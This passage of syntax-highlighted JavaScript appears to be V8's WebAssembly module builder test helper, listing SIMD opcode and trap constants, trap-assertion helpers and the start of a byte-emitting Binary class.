kExprI32x4MaxS <span class="token operator">=</span> <span class="token number">0xb8</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4MaxU <span class="token operator">=</span> <span class="token number">0xb9</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4DotI16x8S <span class="token operator">=</span> <span class="token number">0xba</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4ExtMulLowI16x8S <span class="token operator">=</span> <span class="token number">0xbc</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4ExtMulHighI16x8S <span class="token operator">=</span> <span class="token number">0xbd</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4ExtMulLowI16x8U <span class="token operator">=</span> <span class="token number">0xbe</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4ExtMulHighI16x8U <span class="token operator">=</span> <span class="token number">0xbf</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2Abs <span class="token operator">=</span> <span class="token number">0xc0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2Neg <span class="token operator">=</span> <span class="token number">0xc1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2AllTrue <span class="token operator">=</span> <span class="token number">0xc3</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2BitMask <span class="token operator">=</span> <span class="token number">0xc4</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2SConvertI32x4Low <span class="token operator">=</span> <span class="token number">0xc7</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2SConvertI32x4High <span class="token operator">=</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2UConvertI32x4Low <span class="token operator">=</span> <span class="token number">0xc9</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2UConvertI32x4High <span class="token operator">=</span> <span class="token number">0xca</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2Shl <span class="token operator">=</span> <span class="token number">0xcb</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2ShrS <span class="token operator">=</span> <span class="token number">0xcc</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2ShrU <span class="token operator">=</span> <span class="token number">0xcd</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2Add <span class="token operator">=</span> <span class="token number">0xce</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2Sub <span class="token operator">=</span> <span class="token number">0xd1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2Mul <span class="token operator">=</span> <span class="token number">0xd5</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2Eq <span class="token operator">=</span> <span class="token number">0xd6</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2Ne <span class="token operator">=</span> <span class="token number">0xd7</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2LtS <span class="token operator">=</span> <span class="token number">0xd8</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2GtS <span class="token operator">=</span> <span class="token number">0xd9</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2LeS <span class="token operator">=</span> <span class="token number">0xda</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2GeS <span class="token operator">=</span> <span class="token number">0xdb</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2ExtMulLowI32x4S <span class="token operator">=</span> <span class="token number">0xdc</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2ExtMulHighI32x4S <span class="token operator">=</span> <span class="token number">0xdd</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2ExtMulLowI32x4U <span class="token operator">=</span> <span class="token number">0xde</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2ExtMulHighI32x4U <span class="token operator">=</span> <span class="token number">0xdf</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Abs <span class="token operator">=</span> <span class="token number">0xe0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Neg <span class="token operator">=</span> <span class="token number">0xe1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Sqrt <span class="token operator">=</span> <span class="token number">0xe3</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Add <span class="token operator">=</span> <span class="token number">0xe4</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Sub <span class="token operator">=</span> <span class="token number">0xe5</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Mul <span class="token operator">=</span> <span class="token number">0xe6</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Div <span class="token operator">=</span> <span class="token number">0xe7</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Min <span class="token operator">=</span> <span class="token number">0xe8</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Max <span class="token operator">=</span> <span class="token number">0xe9</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Pmin <span class="token operator">=</span> <span class="token number">0xea</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Pmax <span class="token operator">=</span> <span class="token number">0xeb</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Abs <span class="token operator">=</span> <span class="token number">0xec</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Neg <span class="token operator">=</span> <span class="token number">0xed</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Sqrt <span class="token operator">=</span> <span class="token number">0xef</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Add <span class="token operator">=</span> <span class="token number">0xf0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Sub <span class="token operator">=</span> <span class="token number">0xf1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Mul <span class="token operator">=</span> <span class="token number">0xf2</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Div <span class="token operator">=</span> <span class="token number">0xf3</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Min <span class="token operator">=</span> <span class="token number">0xf4</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Max <span class="token operator">=</span> <span class="token number">0xf5</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Pmin <span class="token operator">=</span> <span class="token number">0xf6</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Pmax <span class="token operator">=</span> <span class="token number">0xf7</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4SConvertF32x4 <span class="token operator">=</span> <span class="token number">0xf8</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4UConvertF32x4 <span class="token operator">=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4SConvertI32x4 <span class="token operator">=</span> <span class="token number">0xfa</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4UConvertI32x4 <span class="token operator">=</span> <span class="token number">0xfb</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4TruncSatF64x2SZero <span class="token operator">=</span> <span class="token number">0xfc</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4TruncSatF64x2UZero <span class="token operator">=</span> <span class="token number">0xfd</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2ConvertLowI32x4S <span class="token operator">=</span> <span class="token number">0xfe</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2ConvertLowI32x4U <span class="token operator">=</span> <span class="token number">0xff</span><span class="token punctuation">;</span>      <span class="token comment">// Relaxed SIMD.</span>      <span class="token keyword">let</span> kExprI8x16RelaxedSwizzle <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4RelaxedTruncF32x4S <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4RelaxedTruncF32x4U <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x102</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4RelaxedTruncF64x2SZero <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x103</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4RelaxedTruncF64x2UZero <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x104</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Qfma <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x105</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Qfms <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x106</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Qfma <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x107</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Qfms <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x108</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16RelaxedLaneSelect <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x109</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8RelaxedLaneSelect <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x10a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4RelaxedLaneSelect <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x10b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2RelaxedLaneSelect <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x10c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4RelaxedMin <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x10d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4RelaxedMax <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x10e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2RelaxedMin <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x10f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2RelaxedMax <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8RelaxedQ15MulRS <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8DotI8x16I7x16S <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x112</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4DotI8x16I7x16AddS <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x113</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Compilation hint constants.</span>      <span class="token keyword">let</span> kCompilationHintStrategyDefault <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kCompilationHintStrategyLazy <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kCompilationHintStrategyEager <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kCompilationHintStrategyLazyBaselineEagerTopTier <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kCompilationHintTierDefault <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kCompilationHintTierBaseline <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kCompilationHintTierOptimized <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapUnreachable <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapMemOutOfBounds <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapDivByZero <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapDivUnrepresentable <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapRemByZero <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapFloatUnrepresentable <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapTableOutOfBounds <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapFuncSigMismatch <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapUnalignedAccess <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapDataSegmentOutOfBounds <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapElementSegmentOutOfBounds <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapRethrowNull <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapArrayTooLarge <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapArrayOutOfBounds <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapNullDereference <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapIllegalCast <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kAtomicWaitOk <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kAtomicWaitNotEqual <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kAtomicWaitTimedOut <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token comment">// Exception handling with exnref.</span>      <span class="token keyword">let</span> kCatchNoRef <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kCatchRef <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kCatchAllNoRef <span class="token operator">=</span> <span class="token number">0x2</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kCatchAllRef <span class="token operator">=</span> <span class="token number">0x3</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTrapMsgs <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">"unreachable"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"memory access out of bounds"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"divide by zero"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"divide result unrepresentable"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"remainder by zero"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"float unrepresentable in integer range"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"table index is out of bounds"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"null function or function signature mismatch"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"operation does not support unaligned accesses"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"data segment out of bounds"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"element segment out of bounds"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"rethrowing null value"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"requested new array is too large"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"array element access out of bounds"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"dereferencing a null pointer"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>        <span class="token string">"illegal cast"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>      <span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">// This requires test/mjsunit/mjsunit.js.</span>      <span class="token keyword">function</span> <span class="token function">assertTraps</span><span class="token punctuation">(</span><span class="token parameter">trap<span class="token punctuation">,</span> code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">assertThrows</span><span class="token punctuation">(</span>          code<span class="token punctuation">,</span>          WebAssembly<span class="token punctuation">.</span>RuntimeError<span class="token punctuation">,</span>          <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>kTrapMsgs<span class="token punctuation">[</span>trap<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">assertTrapsOneOf</span><span class="token punctuation">(</span><span class="token parameter">traps<span class="token punctuation">,</span> code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errorChecker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>          <span class="token string">"("</span> <span class="token operator">+</span> traps<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">trap</span><span class="token punctuation">)</span> <span class="token operator">=></span> kTrapMsgs<span class="token punctuation">[</span>trap<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assertThrows</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> WebAssembly<span class="token punctuation">.</span>RuntimeError<span class="token punctuation">,</span> errorChecker<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">class</span> <span class="token class-name">Binary</span> <span class="token punctuation">&#123;</span>        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token number">8192</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">ensure_space</span><span class="token punctuation">(</span><span class="token parameter">needed</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">>=</span> needed<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> new_capacity <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">.</span>length <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span>new_capacity <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">&lt;</span> needed<span class="token punctuation">)</span> new_capacity <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> new_buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>new_capacity<span class="token punctuation">)</span><span class="token punctuation">;</span>          new_buffer<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer <span class="token operator">=</span> new_buffer<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">.</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ensure_space</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_u16</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ensure_space</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_u32</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ensure_space</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_leb_u</span><span class="token punctuation">(</span><span class="token parameter">val<span class="token punctuation">,</span> max_len</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ensure_space</span><span class="token punctuation">(</span>max_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> max_len<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> v <span class="token operator">=</span> val <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>            val <span class="token operator">=</span> val <span class="token operator">>>></span> <span class="token number">7</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> v<span class="token punctuation">;</span>              <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> v <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Leb value exceeds maximum length of "</span> <span class="token operator">+</span> max_len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_u32v</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_leb_u</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> kMaxVarInt32Size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_u64v</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_leb_u</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> kMaxVarInt64Size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_bytes</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ensure_space</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">+=</span> data<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_string</span><span class="token punctuation">(</span><span class="token parameter">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token comment">// When testing illegal names, we pass a byte array directly.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>string <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>string<span class="token 